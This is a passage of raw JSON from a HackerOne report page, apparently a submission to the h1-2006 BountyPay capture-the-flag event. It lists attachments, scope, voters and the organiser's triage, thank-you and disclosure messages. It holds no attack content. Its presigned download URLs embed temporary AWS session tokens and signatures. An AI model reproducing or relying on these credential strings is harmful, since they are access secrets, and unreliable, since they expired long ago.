%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153912Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=989edc91cda4abd3ff51967b45bf4d2b5d14e06d17f8019da810ff703ecf0bf7","file_size":90123,"type":"image/png"},{"id":859556,"file_name":"BountyPay.apk","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vYLRoViQdgeoVx21eJrRW7By?response-content-disposition=attachment%3B%20filename%3D%22BountyPay.apk%22%3B%20filename%2A%3DUTF-8%27%27BountyPay.apk\u0026response-content-type=application%2Fvnd.android.package-archive\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153913Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=404cba86df8a1d60334b79365e16e3d82eac3091a6a0a30e2c87344e10cb1e60","file_size":4043701,"type":"application/vnd.android.package-archive"},{"id":859607,"file_name":"andriod_challenges_solved.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7KoKF8X2ygkv7xPfyLHzfZzm?response-content-disposition=attachment%3B%20filename%3D%22andriod_challenges_solved.jpg%22%3B%20filename%2A%3DUTF-8%27%27andriod_challenges_solved.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153913Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e9929fba684a23cbe8461d0e93013ca7860031152547350c74b66e820d7b56a0","file_size":26815,"type":"image/jpeg"},{"id":859634,"file_name":"sandra_first_day_pic.jpeg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gnXm85KUyZpNCRnvnqKkP5an?response-content-disposition=attachment%3B%20filename%3D%22sandra_first_day_pic.jpeg%22%3B%20filename%2A%3DUTF-8%27%27sandra_first_day_pic.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153913Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b07eb57e47fd40bef79516032322c6958ff93291728700af8ce71d96636ecad1","file_size":267755,"type":"image/jpeg"},{"id":859704,"file_name":"Screenshot_from_2020-06-09_02-26-29.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QeusQjsiMjrKuAkrStnGJfDZ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_02-26-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_02-26-29.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153913Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=50d6885ee92d839d5cb51fc1b40f5eff7ba94199f1b5d5db76914b030685db8b","file_size":26243,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-18T02:34:23.630Z","allow_singular_disclosure_after":-38927089.37694121,"singular_disclosure_allowed":true,"vote_count":5,"voters":["nytr0gen","brahim_boufakri01","d1r3wolf","tecnical_nitish","supervegeta"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8237016,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-08T21:47:21.732Z","updated_at":"2020-06-08T21:47:21.732Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:03:12.621Z","updated_at":"2020-06-11T23:03:12.621Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324963,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:28:12.040Z","updated_at":"2020-06-17T22:28:12.040Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"d1r3wolf","url":"/d1r3wolf"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8326506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T02:34:23.607Z","updated_at":"2020-06-18T02:34:23.607Z","first_to_agree":true,"actor":{"username":"d1r3wolf","cleared":false,"url":"/d1r3wolf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332784,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T15:28:49.434Z","updated_at":"2020-06-18T15:28:49.434Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332785,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-18T15:28:49.528Z","updated_at":"2020-06-18T15:28:49.528Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}